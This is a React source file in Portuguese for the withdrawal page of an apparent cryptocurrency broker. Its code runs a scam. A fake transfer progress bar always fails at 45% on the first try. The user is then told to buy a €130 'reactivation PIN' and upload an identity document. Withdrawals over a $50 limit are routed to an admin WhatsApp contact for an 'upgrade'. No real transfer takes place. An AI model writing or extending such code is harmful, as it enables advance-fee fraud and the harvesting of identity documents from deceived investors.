import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
  FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey, 
  FaIdCard, FaUpload, FaTimes, FaArrowUp, FaWhatsapp, FaHeadset
} from 'react-icons/fa';
import toast from 'react-hot-toast';
import Navbar from '../components/Navbar';
import { walletService } from '../services/walletService';
import { useAuth } from '../auth/userAuth';
import { getCurrencySymbol } from '../utils/currency';
import { ADMIN_WHATSAPP } from '../data/mockData';
import API from '../utils/axios';

// ✅ LIMITE DE SAQUE – usuários podem sacar até este valor
const WITHDRAWAL_LIMIT = 50;

const Withdraw = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [amount, setAmount] = useState('');
  const [crypto, setCrypto] = useState('USDT');
  const [address, setAddress] = useState('');
  const [loading, setLoading] = useState(false);
  const [walletBalance, setWalletBalance] = useState(0);
  const [kycStatus, setKycStatus] = useState('checking');

  // Estados da simulação de transferência
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [transferProgress, setTransferProgress] = useState(0);
  const [transferStatus, setTransferStatus] = useState('pending');
  const [isRetry, setIsRetry] = useState(false);
  const progressInterval = useRef(null);

  // Estados do modal de reativação
  const [showReactivationModal, setShowReactivationModal] = useState(false);
  const [reactivationPin, setReactivationPin] = useState('');
  const [pinError, setPinError] = useState('');
  const [isVerifyingPin, setIsVerifyingPin] = useState(false);

  // Estado de upload do documento de identidade
  const [idCardFile, setIdCardFile] = useState(null);
  const [idError, setIdError] = useState('');
  const idInputRef = useRef(null);

  // ✅ Estado do modal de upgrade de limite
  const [showUpgradeModal, setShowUpgradeModal] = useState(false);

  // PIN do env ou valor padrão
  const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '123456';

  const currencySymbol = getCurrencySymbol(user?.currency);

  useEffect(() => {
    const checkKYC = async () => {
      try {
        const response = await API.get('/kyc/status');
        if (response.data.success) {
          setKycStatus(response.data.data.status);
        }
      } catch (error) {
        console.error('Erro ao verificar status do KYC:', error);
        setKycStatus('error');
      }
    };
    checkKYC();
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const wallet = await walletService.getWallet();
        setWalletBalance(wallet.balance || 0);
      } catch (error) {
        console.error('Falha ao buscar carteira:', error);
      }
    };
    fetchData();
  }, []);

  useEffect(() => {
    return () => {
      if (progressInterval.current) clearInterval(progressInterval.current);
    };
  }, []);

  useEffect(() => {
    if (showTransferModal) {
      setTransferProgress(0);
      setTransferStatus('pending');
      let progress = 0;
      progressInterval.current = setInterval(() => {
        progress += 1;

        if (progress >= 45 && !isRetry) {
          clearInterval(progressInterval.current);
          progressInterval.current = null;
          setTransferProgress(45);
          setTransferStatus('failed');
          return;
        }

        if (progress >= 100) {
          clearInterval(progressInterval.current);
          progressInterval.current = null;
          setTransferProgress(100);
          setTransferStatus('complete');
          toast.success('Saque concluído com sucesso!');
          return;
        }
        setTransferProgress(progress);
      }, 100);
    } else {
      if (progressInterval.current) {
        clearInterval(progressInterval.current);
        progressInterval.current = null;
      }
      setTransferProgress(0);
      setTransferStatus('pending');
    }
  }, [showTransferModal, isRetry]);

  const cryptos = [
    { id: 'USDT', name: 'Tether', icon: FaBitcoin, color: 'text-green-500' },
    { id: 'BTC', name: 'Bitcoin', icon: FaBitcoin, color: 'text-orange-500' },
    { id: 'ETH', name: 'Ethereum', icon: FaEthereum, color: 'text-purple-500' },
    { id: 'BNB', name: 'BNB', icon: FaBitcoin, color: 'text-yellow-500' },
    { id: 'TRX', name: 'Tron', icon: FaBitcoin, color: 'text-red-500' },
  ];

  const handleSubmit = (e) => {
    e.preventDefault();

    const amountNum = parseFloat(amount);

    // ✅ Passo 1: Validar valor
    if (!amount || amountNum < 1) {
      toast.error('Digite um valor válido');
      return;
    }

    // ✅ Passo 2: Verificação de KYC
    if (kycStatus !== 'verified') {
      toast.error('Verificação KYC necessária. Complete seu KYC para sacar.');
      return;
    }

    // ✅ Passo 3: Verificação de saldo
    if (amountNum > walletBalance) {
      toast.error('Saldo insuficiente');
      return;
    }

    // ✅ Passo 4: Verificação de endereço
    if (!address) {
      toast.error('Digite um endereço de carteira');
      return;
    }

    // ✅ Passo 5: Verificação do limite de saque
    if (amountNum > WITHDRAWAL_LIMIT) {
      // Valor excede o limite → mostra modal de upgrade
      setShowUpgradeModal(true);
      return;
    }

    // ✅ Passo 6: Dentro do limite → prossegue com a simulação de transferência
    setIsRetry(false);
    proceedWithdrawal(amountNum);
  };

  const proceedWithdrawal = async (amountNum) => {
    setLoading(true);
    try {
      await new Promise(resolve => setTimeout(resolve, 800));
      setShowTransferModal(true);
    } catch (error) {
      toast.error(error.response?.data?.message || 'Falha no saque');
    } finally {
      setLoading(false);
    }
  };

  const finalizeWithdrawal = async () => {
    try {
      await API.post('/transactions', {
        type: 'withdrawal',
        amount: parseFloat(amount),
        currency: 'USD',
        description: `Saque para carteira ${crypto}`,
        metadata: {
          cryptoCurrency: crypto,
          walletAddress: address,
        },
        status: 'pending',
      });
    } catch (error) {
      console.error('Erro ao finalizar saque:', error);
    }
  };

  const handleRetry = () => {
    setShowTransferModal(false);
    setShowReactivationModal(true);
    setReactivationPin('');
    setPinError('');
    setIdCardFile(null);
    setIdError('');
  };

  const handleIdFileChange = (e) => {
    const file = e.target.files[0];
    if (!file) return;

    const validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
    if (!validTypes.includes(file.type)) {
      toast.error('Formato de arquivo inválido. Use JPG, PNG ou PDF.');
      return;
    }
    if (file.size > 5 * 1024 * 1024) {
      toast.error('O arquivo deve ter no máximo 5MB.');
      return;
    }

    setIdCardFile(file);
    setIdError('');
  };

  const handleRemoveIdFile = () => {
    setIdCardFile(null);
    if (idInputRef.current) idInputRef.current.value = '';
  };

  const handleVerifyPin = () => {
    if (!idCardFile) {
      setIdError('Por favor, envie seu documento de identidade.');
      return;
    }
    setIdError('');

    if (!reactivationPin.trim()) {
      setPinError('Por favor, insira o PIN de reativação.');
      return;
    }

    setIsVerifyingPin(true);
    setPinError('');

    setTimeout(() => {
      if (reactivationPin.trim() === REACTIVATION_PIN) {
        setShowReactivationModal(false);
        setReactivationPin('');
        setPinError('');
        setIdCardFile(null);
        setIsVerifyingPin(false);
        setIsRetry(true);
        setShowTransferModal(true);
        toast.success('Conta reativada. Concluindo transferência...');
      } else {
        setPinError('PIN inválido. Tente novamente.');
        setReactivationPin('');
        setIsVerifyingPin(false);
      }
    }, 800);
  };

  const handleCloseSuccess = async () => {
    setShowTransferModal(false);
    await finalizeWithdrawal();
    toast.success('Solicitação de saque enviada!');
    navigate('/transactions');
  };

  const formatCurrency = (value) => {
    return `${currencySymbol}${value?.toLocaleString() || '0.00'}`;
  };

  const isKycVerified = kycStatus === 'verified';

  // Link do WhatsApp para o modal de upgrade
  const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
    `Olá, gostaria de aumentar meu limite de saque. Minha solicitação atual de $${parseFloat(amount || 0).toLocaleString()} excede o limite de $${WITHDRAWAL_LIMIT.toLocaleString()}.`
  )}`;

  return (
    <div className="min-h-screen bg-slate-900 pt-16 lg:pl-64 pb-20 lg:pb-0">
      <Navbar />
      <div className="p-4 sm:p-6 max-w-2xl mx-auto">
        <div className="mb-6">
          <h1 className="text-2xl sm:text-3xl font-bold text-white">Sacar Fundos</h1>
          <p className="text-slate-400 mt-1">Saque seus ganhos</p>
        </div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-slate-800/50 backdrop-blur-xl rounded-2xl p-6 border border-slate-700"
        >
          <div className="bg-slate-900 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-slate-400">Saldo Disponível</span>
              <span className="text-xl font-bold text-white">{formatCurrency(walletBalance)}</span>
            </div>
          </div>

          {/* Informação do Limite de Saque */}
          <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-center gap-3">
            <FaInfoCircle className="text-blue-500 text-sm flex-shrink-0" />
            <p className="text-blue-400 text-sm">
              Seu limite de saque é de <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> por solicitação.
            </p>
          </div>

          {!isKycVerified && (
            <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-center gap-3">
              <FaLock className="text-yellow-500 text-sm" />
              <p className="text-yellow-400 text-sm">
                {kycStatus === 'pending'
                  ? 'Seu KYC está pendente de aprovação. Aguarde a verificação.'
                  : 'Verificação KYC necessária para sacar. Complete seu KYC primeiro.'}
              </p>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Selecione a Criptomoeda</label>
              <div className="grid grid-cols-3 sm:grid-cols-5 gap-2">
                {cryptos.map((c) => (
                  <button
                    key={c.id}
                    type="button"
                    onClick={() => setCrypto(c.id)}
                    className={`p-3 rounded-lg border transition ${
                      crypto === c.id
                        ? 'border-blue-500 bg-blue-500/10'
                        : 'border-slate-700 hover:border-slate-500'
                    }`}
                  >
                    <c.icon className={`w-6 h-6 mx-auto ${c.color}`} />
                    <span className="text-xs text-slate-400 mt-1 block">{c.id}</span>
                  </button>
                ))}
              </div>
            </div>

            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Valor ({user?.currency || 'USD'})</label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400">
                  {currencySymbol}
                </span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Digite o valor"
                  min="1"
                  step="0.01"
                  className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                />
              </div>
              {parseFloat(amount) > WITHDRAWAL_LIMIT && (
                <p className="text-red-400 text-xs mt-1">
                  O valor excede seu limite de saque de {formatCurrency(WITHDRAWAL_LIMIT)}.
                </p>
              )}
            </div>

            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Endereço da Carteira</label>
              <input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                placeholder="Digite o endereço da sua carteira"
                className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
              />
            </div>

            <button
              type="submit"
              disabled={loading || !isKycVerified}
              className="w-full py-3 rounded-lg bg-gradient-to-r from-orange-600 to-red-600 text-white font-semibold hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <>
                  <FaArrowDown className="text-sm" /> Solicitar Saque
                </>
              )}
            </button>
          </form>
        </motion.div>
      </div>

      {/* ✅ MODAL DE UPGRADE DE LIMITE */}
      <AnimatePresence>
        {showUpgradeModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md"
            >
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-orange-500/10 border border-orange-500/30 rounded-full flex items-center justify-center">
                  <FaArrowUp className="w-8 h-8 text-orange-500" />
                </div>
              </div>

              <h3 className="text-xl font-bold text-white text-center mb-2">
                Limite de Saque Excedido
              </h3>

              <p className="text-sm text-slate-400 text-center mb-4">
                Sua solicitação de saque de{' '}
                <strong className="text-white">{formatCurrency(parseFloat(amount) || 0)}</strong>{' '}
                excede seu limite atual de{' '}
                <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
              </p>

              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                <p className="text-orange-300 text-xs leading-relaxed">
                  Para aumentar seu limite de saque, entre em contato com nossa equipe de suporte.
                  Eles irão orientá-lo através do processo de upgrade da conta.
                </p>
              </div>

              <div className="flex gap-3">
                <button
                  onClick={() => setShowUpgradeModal(false)}
                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                >
                  Cancelar
                </button>
                <a
                  href={whatsappUpgradeLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
                >
                  <FaWhatsapp className="text-lg" />
                  Falar com Suporte
                </a>
              </div>

              <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
                <FaHeadset className="text-slate-500" />
                <span>Suporte disponível 24/7</span>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* MODAL DE SIMULAÇÃO DE TRANSFERÊNCIA */}
      <AnimatePresence>
        {showTransferModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center"
            >
              <div className="flex justify-center mb-4">
                {transferStatus === 'pending' && (
                  <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
                    <div className="w-8 h-8 border-3 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                  </div>
                )}
                {transferStatus === 'failed' && (
                  <div className="w-16 h-16 bg-red-500/10 border border-red-500/30 rounded-full flex items-center justify-center">
                    <FaExclamationTriangle className="w-8 h-8 text-red-500" />
                  </div>
                )}
                {transferStatus === 'complete' && (
                  <div className="w-16 h-16 bg-green-500/10 border border-green-500/30 rounded-full flex items-center justify-center">
                    <FaCheckCircle className="w-8 h-8 text-green-500" />
                  </div>
                )}
              </div>

              <h3 className="text-xl font-bold text-white mb-2">
                {transferStatus === 'pending' && 'Processando Transferência...'}
                {transferStatus === 'failed' && 'Falha na Transferência'}
                {transferStatus === 'complete' && 'Transferência Concluída!'}
              </h3>

              <p className="text-sm text-slate-400 mb-4">
                {transferStatus === 'pending' && 'Movendo fundos da carteira do corretor para sua carteira de destino.'}
                {transferStatus === 'failed' && 'A transferência não pôde ser concluída. Por favor, tente novamente.'}
                {transferStatus === 'complete' && 'Seus fundos foram enviados com sucesso!'}
              </p>

              <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
                <div
                  className={`h-full rounded-full transition-all duration-300 ${
                    transferStatus === 'failed'
                      ? 'bg-red-500'
                      : transferStatus === 'complete'
                      ? 'bg-green-500'
                      : 'bg-blue-500'
                  }`}
                  style={{ width: `${transferProgress}%` }}
                />
              </div>
              <p className="text-xs text-slate-500 mb-4">{transferProgress}%</p>

              {transferStatus === 'failed' && (
                <button
                  onClick={handleRetry}
                  className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:opacity-90 transition-all"
                >
                  Tentar Novamente
                </button>
              )}

              {transferStatus === 'complete' && (
                <button
                  onClick={handleCloseSuccess}
                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition-all"
                >
                  Concluir
                </button>
              )}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* MODAL DE REATIVAÇÃO */}
      <AnimatePresence>
        {showReactivationModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto"
            >
              <div className="flex justify-center mb-4">
                <div className="w-16 h-16 bg-yellow-500/10 border border-yellow-500/30 rounded-full flex items-center justify-center">
                  <FaShieldAlt className="w-8 h-8 text-yellow-500" />
                </div>
              </div>

              <h3 className="text-xl font-bold text-white text-center mb-2">
                Reativação de Conta Necessária
              </h3>

              <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                <p className="text-orange-300 text-xs leading-relaxed">
                  Por segurança, por favor envie seu documento de identidade e insira seu PIN de
                  reativação. Um PIN de reativação custa{' '}
                  <strong className="text-orange-200">€130,00</strong> e deve ser adquirido
                  antes de concluir este saque.
                </p>
              </div>

              <div className="mb-4">
                <label className="block text-slate-300 text-sm font-medium mb-2">
                  Enviar Documento de Identidade
                </label>

                {!idCardFile ? (
                  <label
                    htmlFor="idCardInput"
                    className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-slate-600 rounded-lg cursor-pointer hover:border-blue-500 transition"
                  >
                    <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
                    <span className="text-xs text-slate-400">
                      Clique para enviar (JPG, PNG, PDF – máx 5MB)
                    </span>
                    <input
                      id="idCardInput"
                      ref={idInputRef}
                      type="file"
                      accept="image/*,.pdf"
                      onChange={handleIdFileChange}
                      className="hidden"
                    />
                  </label>
                ) : (
                  <div className="flex items-center justify-between p-3 bg-slate-900 border border-slate-700 rounded-lg">
                    <div className="flex items-center gap-2 min-w-0">
                      <FaIdCard className="w-5 h-5 text-green-500 flex-shrink-0" />
                      <span className="text-sm text-slate-300 truncate">
                        {idCardFile.name}
                      </span>
                    </div>
                    <button
                      type="button"
                      onClick={handleRemoveIdFile}
                      className="p-1 hover:bg-slate-700 rounded transition flex-shrink-0"
                    >
                      <FaTimes className="w-4 h-4 text-slate-400" />
                    </button>
                  </div>
                )}
                {idError && (
                  <p className="text-red-400 text-xs mt-2">{idError}</p>
                )}
              </div>

              <div className="mb-4">
                <label className="block text-slate-300 text-sm font-medium mb-2">
                  PIN de Reativação
                </label>
                <div className="relative">
                  <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
                  <input
                    type="password"
                    value={reactivationPin}
                    onChange={(e) => setReactivationPin(e.target.value)}
                    placeholder="Digite o PIN"
                    maxLength="6"
                    className={`w-full bg-slate-900 border ${
                      pinError ? 'border-red-500' : 'border-slate-700'
                    } rounded-lg pl-10 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition`}
                  />
                </div>
                {pinError && (
                  <p className="text-red-400 text-xs mt-2">{pinError}</p>
                )}
              </div>

              <div className="flex gap-3">
                <button
                  onClick={() => setShowReactivationModal(false)}
                  className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                >
                  Cancelar
                </button>
                <button
                  onClick={handleVerifyPin}
                  disabled={isVerifyingPin}
                  className="flex-1 py-3 rounded-lg bg-gradient-to-r from-yellow-600 to-orange-600 text-white font-semibold hover:opacity-90 transition disabled:opacity-50 flex items-center justify-center gap-2"
                >
                  {isVerifyingPin ? (
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                  ) : (
                    'Reativar'
                  )}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default Withdraw;